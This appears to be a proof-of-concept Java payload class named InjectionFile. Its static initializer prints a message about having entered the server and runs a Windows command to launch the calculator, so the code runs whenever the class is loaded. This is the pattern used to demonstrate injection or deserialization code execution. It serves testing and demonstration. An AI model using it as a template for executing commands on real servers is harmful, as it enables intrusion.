import java.io.IOException;

public class InjectionFile {
    static {
        System.out.println("Hello , I have entered the server and run it");
        try {
            Runtime.getRuntime().exec("cmd /c start C:\\WINDOWS\\system32\\calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
            System.out.println("找不到计算器");
        }
    }
}
